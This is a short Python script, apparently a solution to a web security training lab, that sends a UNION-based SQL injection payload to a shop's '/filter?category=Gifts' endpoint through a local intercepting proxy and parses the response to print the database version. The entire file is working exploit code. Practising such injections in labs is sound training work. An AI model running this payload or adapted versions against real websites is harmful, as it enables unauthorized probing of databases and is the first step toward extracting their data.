import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_version(url):
    path = "/filter?category=Gifts"
    sql_payload = "' UNION select @@version, NULL%23"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    version = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
    if version is None:
        return False
    else:
        print("[+] the database version is: " + version)
        return True

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the version of the database...")
    if not exploit_sqli_version(url):
        print("Unable to dump the databse version.")
